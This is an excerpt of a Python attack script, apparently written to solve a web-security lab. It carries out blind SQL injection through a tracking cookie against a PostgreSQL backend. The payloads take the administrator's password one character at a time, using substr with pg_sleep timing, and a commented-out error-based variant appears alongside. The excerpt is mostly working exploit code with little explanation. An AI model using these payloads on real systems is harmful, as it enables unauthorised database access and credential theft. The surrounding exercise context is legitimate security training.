...
SESSION_COOKIE = "QKiJYYNcUz3hke2mJNEbNQcpiRjdYYvy"
TRACKING_PREFIX = "IZNnt2wURennW4cW'"
...
def test_char(url, position, char):
    ...
    payload = (
        # f"' || (select CASE when (1=1) then to_char(1/0) else '' end from users where username = 'administrator' and substr(password,{position},1) = '{char}') || '"
        f"' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(10) END from users where username='administrator' and substr(password,{position},1) = '{char}')--"
    )
    ...
    # check the time taken for the response
